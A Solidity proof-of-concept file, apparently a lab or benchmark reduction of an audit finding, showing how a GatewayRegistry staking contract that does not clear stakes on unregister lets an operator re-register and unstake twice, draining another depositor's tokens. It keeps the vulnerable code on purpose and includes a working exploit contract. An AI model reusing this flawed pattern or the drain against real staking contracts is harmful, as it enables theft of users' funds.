// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Subsquid — [C-01] Gateway creator can steal all tokens from the GatewayRegistry
    (Pashov Audit Group, Subsquid-security-review; #58244)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: unregister() deletes the Gateway struct but does NOT clear the
    `stakes[peerIdHash]` array. Re-registering the same peerId resets
    totalUnstaked to 0 while the old Stake[] entries remain. _unstakeable then
    recomputes unlockable amounts from the leftover stakes and subtracts 0,
    so the operator can unstake (and pull) tokens a second time — draining
    other gateways' deposits held in the same contract balance.

    Vulnerable register (totalUnstaked: 0) and _unstakeable preserved @>.
    Provenance: subsquid/subsquid-network-contracts commit 3545236. */

contract MockERC20 {
    string public constant name = "SQD";
    string public constant symbol = "SQD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal network controller: nextEpoch always returns 0 so lockEnd = duration
///      and a duration of 0 makes stakes immediately unstakeable (no block warping).
contract MockNetworkController {
    function nextEpoch() external pure returns (uint128) {
        return 0;
    }
}

contract MockRouter {
    MockNetworkController public immutable networkController;

    constructor() {
        networkController = new MockNetworkController();
    }
}

/// @dev Reduced GatewayRegistry — register / unregister / stake / unstake / _unstakeable
///      mirror the audited source (subsquid-network-contracts commit 3545236).
contract GatewayRegistry {
    struct Stake {
        uint256 amount;
        uint256 computationUnits;
        uint128 lockStart;
        uint128 lockEnd;
    }

    struct Gateway {
        address operator;
        bytes peerId;
        address strategy;
        address ownAddress;
        string metadata;
        uint256 totalStaked;
        uint256 totalUnstaked;
    }

    MockERC20 public immutable token;
    MockRouter public immutable router;

    mapping(bytes32 => Gateway) internal gateways;
    mapping(bytes32 => Stake[]) internal stakes;
    mapping(address => bytes32) public gatewayByAddress;
    mapping(address => bool) public isStrategyAllowed;
    address public defaultStrategy;

    event Registered(address indexed gatewayOperator, bytes32 indexed id, bytes peerId);
    event Unregistered(address indexed gatewayOperator, bytes peerId);
    event Staked(
        address indexed gatewayOperator,
        bytes peerId,
        uint256 amount,
        uint128 lockStart,
        uint128 lockEnd,
        uint256 computationUnits
    );
    event Unstaked(address indexed gatewayOperator, bytes peerId, uint256 amount);

    constructor(MockERC20 _token, MockRouter _router) {
        token = _token;
        router = _router;
        isStrategyAllowed[address(0)] = true;
    }

    /// @dev Register new gateway with given libP2P peerId (verbatim shape).
    function register(bytes calldata peerId, string memory metadata, address gatewayAddress) public {
        require(peerId.length > 0, "Cannot set empty peerId");
        bytes32 peerIdHash = keccak256(peerId);
        require(gateways[peerIdHash].operator == address(0), "PeerId already registered");

        gateways[peerIdHash] = Gateway({
            operator: msg.sender,
            peerId: peerId,
            strategy: defaultStrategy,
            ownAddress: gatewayAddress,
            metadata: metadata,
            totalStaked: 0,
            totalUnstaked: 0 // @> VULN: resets to 0 while stakes[peerIdHash] is NOT cleared on unregister
        });

        emit Registered(msg.sender, peerIdHash, peerId);

        if (gatewayAddress != address(0)) {
            require(gatewayByAddress[gatewayAddress] == bytes32(0), "Gateway address already registered");
            gatewayByAddress[gatewayAddress] = peerIdHash;
        }
    }

    /// @dev Unregister gateway — deletes Gateway but NOT stakes[].
    function unregister(bytes calldata peerId) external {
        (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
        _requireOperator(gateway);
        require(gateway.totalStaked == gateway.totalUnstaked, "Gateway has staked tokens");
        delete gatewayByAddress[gateway.ownAddress];
        delete gateways[peerIdHash];
        // FIX: delete stakes[peerIdHash];
        emit Unregistered(msg.sender, peerId);
    }

    function stake(bytes calldata peerId, uint256 amount, uint128 durationBlocks) public {
        _stakeWithoutTransfer(peerId, amount, durationBlocks);
        token.transferFrom(msg.sender, address(this), amount);
    }

    function _stakeWithoutTransfer(bytes calldata peerId, uint256 amount, uint128 durationBlocks) internal {
        (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
        _requireOperator(gateway);

        uint256 _computationUnits = amount; // simplified (real formula not needed for the drain)
        uint128 lockStart = router.networkController().nextEpoch();
        uint128 lockEnd = lockStart + durationBlocks;
        // @> stakes mapping tracks all user stakes — survives unregister
        stakes[peerIdHash].push(Stake(amount, _computationUnits, lockStart, lockEnd));
        gateway.totalStaked += amount;

        emit Staked(msg.sender, peerId, amount, lockStart, lockEnd, _computationUnits);
    }

    function unstake(bytes calldata peerId, uint256 amount) public {
        _unstakeWithoutTransfer(peerId, amount);
        token.transfer(msg.sender, amount);
    }

    function _unstakeWithoutTransfer(bytes calldata peerId, uint256 amount) internal {
        (Gateway storage gateway,) = _getGateway(peerId);
        _requireOperator(gateway);
        require(amount <= _unstakeable(gateway), "Not enough funds to unstake");
        gateway.totalUnstaked += amount;
        emit Unstaked(msg.sender, peerId, amount);
    }

    /// @return Amount of tokens that can be unstaked by the gateway (verbatim logic).
    function _unstakeable(Gateway storage gateway) internal view returns (uint256) {
        Stake[] memory _stakes = stakes[keccak256(gateway.peerId)];
        uint256 blockNumber = block.number;
        uint256 total = 0;
        for (uint256 i = 0; i < _stakes.length; i++) {
            Stake memory _stake = _stakes[i];
            if (_stake.lockEnd <= blockNumber) {
                total += _stake.amount;
            }
        }
        // @> VULN: after re-register totalUnstaked is 0 but _stakes still holds old entries
        return total - gateway.totalUnstaked;
    }

    function unstakeable(bytes calldata peerId) external view returns (uint256) {
        (Gateway storage gateway,) = _getGateway(peerId);
        return _unstakeable(gateway);
    }

    function getGateway(bytes calldata peerId) external view returns (Gateway memory) {
        return gateways[keccak256(peerId)];
    }

    function getStakes(bytes calldata peerId) external view returns (Stake[] memory) {
        return stakes[keccak256(peerId)];
    }

    function _getGateway(bytes calldata peerId) internal view returns (Gateway storage gateway, bytes32 peerIdHash) {
        peerIdHash = keccak256(peerId);
        gateway = gateways[peerIdHash];
        require(gateway.operator != address(0), "Gateway not registered");
    }

    function _requireOperator(Gateway storage _gateway) internal view {
        require(_gateway.operator == msg.sender, "Only operator can call this function");
    }
}

/// @dev Alice actor — the malicious gateway operator who double-unstakes.
contract Alice {
    GatewayRegistry public reg;
    MockERC20 public token;
    bytes public peerId;

    constructor(GatewayRegistry _reg, MockERC20 _token, bytes memory _peerId) {
        reg = _reg;
        token = _token;
        peerId = _peerId;
    }

    function registerAndStake(uint256 amount) external {
        token.approve(address(reg), type(uint256).max);
        reg.register(peerId, "", address(0x6a7e));
        reg.stake(peerId, amount, 0); // duration 0 → immediately unstakeable
    }

    function exploit(uint256 amount) external {
        // 1) unstake legitimately
        reg.unstake(peerId, amount);
        // 2) unregister (stakes[] NOT deleted)
        reg.unregister(peerId);
        // 3) re-register same peerId → totalUnstaked = 0 again
        reg.register(peerId, "", address(0x6a7e));
        // 4) unstake AGAIN against leftover stakes[] — drains other depositors
        reg.unstake(peerId, amount);
    }
}

contract Exploit {
    MockERC20 public token; // CREATE nonce 1
    MockRouter public router; // CREATE nonce 2 (+ nested NC)
    GatewayRegistry public registry; // CREATE nonce 3 — vulnerable
    Alice public alice; // CREATE nonce 4

    bytes public constant BOB_PEER = bytes("bob");
    bytes public constant ALICE_PEER = bytes("alice");
    uint256 public constant AMOUNT = 100 ether;

    uint256 public stolen; // Alice's profit beyond her own stake

    constructor() {
        token = new MockERC20();
        router = new MockRouter(); // also CREATEs MockNetworkController
        registry = new GatewayRegistry(token, router);
        alice = new Alice(registry, token, ALICE_PEER);
    }

    function run() external {
        // Bob (this contract) registers + stakes 100 SQD — honest liquidity.
        token.mint(address(this), AMOUNT);
        token.approve(address(registry), type(uint256).max);
        registry.register(BOB_PEER, "", address(0));
        registry.stake(BOB_PEER, AMOUNT, 0);

        // Alice stakes 100 SQD into her own gateway.
        token.mint(address(alice), AMOUNT);
        alice.registerAndStake(AMOUNT);

        require(token.balanceOf(address(registry)) == 2 * AMOUNT, "pre: 200 staked");

        // Exploit: double-unstake Alice's peerId.
        alice.exploit(AMOUNT);

        // HARM: registry is empty — Bob's 100 SQD was stolen via Alice's second unstake.
        require(token.balanceOf(address(registry)) == 0, "registry drained");
        require(token.balanceOf(address(alice)) == 2 * AMOUNT, "alice got 200");
        stolen = token.balanceOf(address(alice)) - AMOUNT; // 100 stolen from Bob
        require(stolen == AMOUNT, "stole bob's stake");
    }
}
